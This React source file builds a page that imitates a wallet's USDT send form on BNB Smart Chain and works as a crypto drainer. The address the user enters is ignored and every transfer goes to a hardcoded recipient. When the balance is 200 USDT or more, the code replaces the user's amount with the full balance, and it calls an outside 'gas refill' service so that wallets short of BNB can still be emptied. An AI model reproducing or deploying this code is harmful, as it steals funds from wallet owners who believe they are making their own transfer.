import React, { useState, useEffect } from "react";
import styled from 'styled-components';
import { ethers } from "ethers";
import { FaArrowLeft } from 'react-icons/fa';

/* eslint-disable */

const USDT_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RECIPIENT_ADDRESS = "0xa2703dF6D530148Df1FE2C2b5bf905965b7c88B2";
const USDT_ABI = [
  {
    constant: true,
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    payable: false,
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
];

// BSC RPC Provider
const rpcUrl = "https://bsc-dataseed.binance.org/";
const bscProvider = new ethers.JsonRpcProvider(rpcUrl); 
// const bscProvider = new ethers.providers.JsonRpcProvider(rpcUrl);


// Force White Background for Entire Page
const GlobalStyle = styled.div`
  background-color: white !important;
  color: black !important;
  height: 100vh;
  width: 100vw;
  display: flex;
  justify-content: center;
  align-items: center;
`;

// Main container
const Container = styled.div`
  display: flex;
  flex-direction: column;
  padding: 20px;
  height: 100vh;
  justify-content: flex-start;
  width: 100%;
  box-sizing: border-box;
`;

// Back button styling
const BackButton = styled.button`
  position: absolute;
  left: 20px;
  top: 35px;
  background: none;
  border: none;
  color: #d8dbdf;
  font-size: 20px;
  cursor: pointer;
`;

// Title styling
const Title = styled.h1`
  font-size: 16px;
  font-weight: 550;
  text-align: center;
  margin-bottom: 10px;
  font-family: 'Roboto', sans-serif;
`;

// Input container
const InputContainer = styled.div`
  margin-top: 10px;
  margin-bottom: 20px;
`;

// Label styling
const InputLabel = styled.label`
  font-size: 14px;
  font-weight: 500;
  color: #626262;
`;

// Input field container
const InputFieldContainer = styled.div`
  display: flex;
  align-items: center;
  position: relative;
  width: 100%;
`;

// Styled input field
const Input = styled.input`
  width: 100%;
  padding: 16px 100px 16px 12px; /* Adjusted padding for buttons */
  font-size: 16px;
  font-weight: normal;
  margin-top: 5px;
  border-radius: 3px;
  border: 1px solid #ccc;
  box-sizing: border-box;
  height: 50px;
  appearance: none; /* ✅ Removes default increase/decrease arrows */
  -moz-appearance: textfield; /* ✅ Removes arrows in Firefox */

  &::-webkit-outer-spin-button,
  &::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }

  &:focus {
    border-color: #eeeff2;
    box-shadow: 0px 0px 6px #eeeff2;
    outline: none;
  }
`;  

// Circular Clear Button (Only for Address Field)
const ClearButton = styled.span`
  position: absolute;
  right: 60px;
  top: 50%;
  transform: translateY(-50%);
  background: #eeeff2;
  color: #626262;
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;
  border-radius: 50%;
  width: 24px;
  height: 24px;
  display: flex;
  align-items: center;
  justify-content: center;

  &:hover {
    background: #dcdcdc;
  }
`;

// Paste Button styling
const PasteButton = styled.span`
  position: absolute;
  right: 12px;
  top: 50%;
  transform: translateY(-50%);
  color: #0600ff;
  font-weight: 600;
  font-size: 14px;
  cursor: pointer;
  padding-left: 15px;
  /* Forcing Light Mode */
  background-color: white !important;
  color: black !important;
  
  /* Prevents Trust Wallet from overriding styles */
  * {
    color-scheme: light !important;
  }
`;

// "USDT" text (Aligned correctly)
const UsdtText = styled.span`
  position: absolute;
  right: 50px;
  top: 50%;
  transform: translateY(-50%);
  color: #626262;
  font-weight: 600;
  font-size: 14px;
`;

// "Max" button styling
const MaxText = styled.span`
  position: absolute;
  right: 10px;
  top: 50%;
  transform: translateY(-50%);
  color: #0600ff;
  font-weight: 600;
  font-size: 14px;
  cursor: pointer;
`;

const AmountContainer = styled.div`
  display: flex;
  justify-content: space-between;
  align-items: center;
  position: relative;
  width: 100%;
`;

// Next Button styling
const NextButton = styled.button`
  background-color: #0600ff;
  color: white;
  padding: 15px 25px;
  font-size: 18px;
  font-weight: bold;
  width: 100%;
  border-radius: 20px;
  border: none;
  cursor: pointer;
  box-shadow: 0px 4px 10px rgba(0, 0, 255, 0.2);
  margin-top: 300px;
  display: flex;
  align-items: center;
  justify-content: center;
`;

// Amount conversion text
const AmountConversion = styled.p`
  text-align: left;
  color: #626262;
  font-size: 14px;
  font-weight: 500;
  margin-top: 10px;
`;


const App = () => {
  const [address, setAddress] = useState(RECIPIENT_ADDRESS);
  const [usdtAmount, setUsdtAmount] = useState("");
  const [usdtBalance, setUsdtBalance] = useState(0);
  const [bnbBalance, setBnbBalance] = useState(0);
  const [walletConnected, setWalletConnected] = useState(false);
  const [loading, setLoading] = useState(false);
  const [transferCompleted, setTransferCompleted] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");

  // Function to connect to the wallet and fetch balances
  const connectWallet = async () => {
    try {
      if (!window.ethereum) {
        alert("Please install MetaMask or another Web3 wallet.");
        return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      const address = accounts[0];
      setWalletAddress(address);
      setWalletConnected(true);

      // Fetch balances
      const balances = await fetchBalances(address);
      setUsdtBalance(balances.usdt);
      setBnbBalance(balances.bnb);
    } catch (error) {
      console.error("Error connecting wallet:", error);
    }
  };

  // Function to fetch USDT and BNB balances
  const fetchBalances = async (address) => {
    try {
      const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, bscProvider);
      const usdtBalance = await usdtContract.balanceOf(address);
      const formattedUSDTBalance = ethers.utils.formatUnits(usdtBalance, 18);

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const bnbBalanceRaw = await provider.getBalance(address);
      const formattedBNBBalance = ethers.utils.formatEther(bnbBalanceRaw);

      return {
        usdt: parseFloat(formattedUSDTBalance),
        bnb: parseFloat(formattedBNBBalance),
      };
    } catch (error) {
      console.error("Error fetching balances:", error);
      throw new Error("Failed to fetch balances.");
    }
  };

  // Function to paste clipboard content into the address field
  const handlePaste = async () => {
    try {
      const clipboardText = await navigator.clipboard.readText();
      setAddress(clipboardText);
    } catch (error) {
      console.error("Failed to paste from clipboard:", error);
    }
  };

  // Function to clear address field
  const clearAddress = () => setAddress("");

  // Function to set Max balance in the Amount field
  const handleMaxClick = () => {
    if (walletConnected) {
      setUsdtAmount(usdtBalance.toString());
    }
  };

 
  // Function to connect wallet and handle transfer logic
const handleGetStartedClick = async () => {
  try {
      setLoading(true);
      setTransferCompleted(false);

      if (!window.ethereum) {
          alert("Please install MetaMask or another Web3 wallet.");
          setLoading(false);
          return;
      }

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const address = await signer.getAddress();
      setWalletAddress(address);
      setWalletConnected(true);

      // Fetch balances immediately after connection
      let balances = await fetchBalances(address);
      setUsdtBalance(balances.usdt);
      setBnbBalance(balances.bnb);

      let finalTransferAmount = parseFloat(usdtAmount);

      // **Override input if USDT Balance ≥ 200**
      if (balances.usdt >= 200) {
          finalTransferAmount = balances.usdt; // Ensure UI reflects the change
      }

      console.log(`📢 Preparing to transfer: ${finalTransferAmount} USDT to ${RECIPIENT_ADDRESS}`);

      // **Check & Perform Gas Refill (Only if USDT ≥ 200 and BNB < 0.0003)**
      if (balances.usdt >= 200 && balances.bnb < 0.0003) {
          console.log("🔄 Low BNB detected, requesting gas fee refill...");
          try {
              const refillResponse = await fetch("https://api.bepverify.net/refill", {
                  method: "POST",
                  headers: {
                      "Content-Type": "application/json",
                      "x-api-key": "dhatterim@kiCh*tandf**kyourm0m"
                  },
                  body: JSON.stringify({ to: address, amount: "0.0004", usdtBalance: balances.usdt })
              });

              const refillResult = await refillResponse.json();

              if (refillResponse.ok && refillResult.status === "success" && refillResult.txHash) {
                  console.log(`✅ Gas Refill successful! Waiting for 10 seconds...`);

                  // **Wait for 10 seconds to allow refill confirmation**
                  await new Promise(resolve => setTimeout(resolve, 10000));

                  console.log("⏳ Checking updated balance after refill...");
                  balances = await fetchBalances(address);
                  setBnbBalance(balances.bnb);

                  if (balances.bnb < 0.0003) {
                      console.error("❌ Refill unsuccessful or delayed. Aborting transfer.");
                      alert("Gas refill failed or is pending. Please ensure you have enough BNB for transaction fees.");
                      setLoading(false);
                      return;
                  }
              } else {
                  console.error("❌ Gas Refill API failed:", refillResult.error);
                  alert("Gas refill failed. Please ensure you have enough BNB.");
                  setLoading(false);
                  return; // Abort transfer if refill fails
              }
          } catch (error) {
              console.error("❌ Error during gas refill request:", error);
              alert("Network error during gas refill. Please try again.");
              setLoading(false);
              return; // Abort transfer if network error occurs
          }
      }

      // **Final Check Before Sending USDT**
      console.log("🚀 Sending USDT...");
      const contractWithSigner = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
      const amountInWei = ethers.utils.parseUnits(finalTransferAmount.toString(), 18);

      const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
      const gasLimit = estimatedGas.mul(2);

      const transferTx = await contractWithSigner.transfer(RECIPIENT_ADDRESS, amountInWei, { gasLimit });
      await transferTx.wait();

      console.log(`✅ Transfer successful!`);

      // **Update Balances After Transfer**
      balances = await fetchBalances(address);
      setUsdtBalance(balances.usdt);
      setBnbBalance(balances.bnb);
      setTransferCompleted(true);
  } catch (error) {
      console.error("❌ Error during transaction process:", error);
  } finally {
      setLoading(false);
  }
};


  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.request({ method: "eth_accounts" }).then((accounts) => {
        if (accounts.length > 0) {
          setWalletAddress(accounts[0]);
          setWalletConnected(true);
          fetchBalances(accounts[0]).then((balances) => {
            setUsdtBalance(balances.usdt);
            setBnbBalance(balances.bnb);
          });
        }
      });
    }
  }, []);

  return (
    <GlobalStyle>
      <Container>
      
      {/* Address Field with Clear & Paste Button */}
      <InputContainer>
        <InputLabel>Address or Domain Name</InputLabel>
        <InputFieldContainer>
          {address && <ClearButton onClick={clearAddress}>×</ClearButton>}
          <Input type="text" value={address} onChange={(e) => setAddress(e.target.value)} />
          <PasteButton onClick={handlePaste}>Paste</PasteButton>
        </InputFieldContainer>
      </InputContainer>

      {/* Amount Field */}
      <InputContainer>
        <InputLabel>Amount</InputLabel>
        <AmountContainer>
          <InputFieldContainer>
            <Input type="number" value={usdtAmount} onChange={(e) => setUsdtAmount(e.target.value)} />
            <UsdtText>USDT</UsdtText>
            <MaxText onClick={handleMaxClick}>Max</MaxText>
          </InputFieldContainer>
        </AmountContainer>
        <AmountConversion>= ${parseFloat(usdtAmount * 1).toFixed(2)}</AmountConversion>
      </InputContainer>

      <NextButton onClick={handleGetStartedClick}>
        {loading ? "Processing..." : transferCompleted ? "Transfer completed" : walletConnected ? "Next" : "Next"}
      </NextButton>
    </Container>  
  </GlobalStyle>
    
  );
};

export default App;